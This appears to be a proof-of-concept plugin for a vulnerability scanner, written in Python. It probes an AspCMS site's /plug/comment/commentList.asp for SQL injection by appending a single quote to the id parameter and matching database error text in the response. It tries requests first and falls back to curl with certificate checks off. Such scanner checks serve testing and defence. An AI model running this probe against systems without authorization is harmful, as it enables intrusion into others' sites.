from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType
import requests
import subprocess

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "AspCMS commentList.asp SQL注入"
        self.app_name = 'AspCMS'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        test_url = target.rstrip('/') + '/plug/comment/commentList.asp?id=1\''

        # 方法1：使用 requests（适用于绝大多数场景）
        try:
            resp = requests.get(test_url, timeout=10, verify=False)
            if resp.status_code == 200 and '错误号' in resp.text and 'sql=' in resp.text:
                self.logger.info("发现 AspCMS commentList.asp SQL注入漏洞")
                return test_url
        except Exception:
            pass

        # 方法2：降级使用系统 curl（处理特殊 SSL 场景）
        try:
            result = subprocess.run(
                ['curl', '-k', '-s', test_url],
                capture_output=True, timeout=10,
                encoding='utf-8', errors='ignore'
            )
            if '错误号' in result.stdout and 'sql=' in result.stdout:
                self.logger.info("发现 AspCMS commentList.asp SQL注入漏洞")
                return test_url
        except Exception:
            pass

        return None